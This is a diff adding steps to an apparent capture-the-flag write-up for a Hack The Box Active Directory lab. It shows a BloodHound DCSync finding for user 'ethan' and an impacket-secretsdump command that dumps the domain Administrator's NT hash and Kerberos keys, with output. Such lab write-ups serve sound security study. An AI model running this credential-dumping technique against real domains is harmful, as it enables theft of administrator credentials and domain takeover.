@@ -552,3 +552,22 @@ Candidate.Engine.: Device Generator
 Candidates.#1....: 123456 -> christal
 Hardware.Mon.#1..: Temp: 44c Util:  9%
 ```
+
+bloodhound dc sync for user ethan:
+![image](https://github.com/user-attachments/assets/a8e4485f-0382-4e8c-a531-e607733637dd)
+
+get password hash for admin:
+```bash
+└──╼ [★]$ impacket-secretsdump administrator.htb/ethan@10.129.96.179 -just-dc-user Administrator
+Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
+Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
+Administrator:des-cbc-md5:403286f7cdf18385
+[*] Cleaning up... 
+```
